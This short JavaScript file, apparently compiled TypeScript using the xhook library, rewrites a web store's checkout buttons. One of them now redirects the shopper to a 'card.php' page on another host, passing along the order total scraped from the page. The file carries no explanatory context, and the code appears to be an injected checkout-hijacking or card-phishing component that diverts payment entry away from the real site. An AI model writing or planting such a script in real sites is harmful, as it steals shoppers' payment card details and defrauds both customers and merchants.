import xhook from 'xhook';
console.log(xhook.after);
debugger;
console.log(Array.from(document.getElementsByClassName('js-continue-checkout-button')));
const checkout = Array.from(document.getElementsByClassName('js-continue-checkout-button'));
if (checkout.length > 0) {
    checkout.forEach(v => v.onclick = () => { location.href = location.href + '/checkout'; });
}
const checkout2 = Array.from(document.getElementsByClassName('checkout-next'));
if (checkout2.length > 0) {
    checkout2.forEach(v => v.onclick = () => { var _a, _b; location.href = `http://localhost:80/card.php?price=${(_b = (_a = document.querySelector('#totaltotalPriceDiv > span')) === null || _a === void 0 ? void 0 : _a.textContent) === null || _b === void 0 ? void 0 : _b.substring(4)}`; });
}
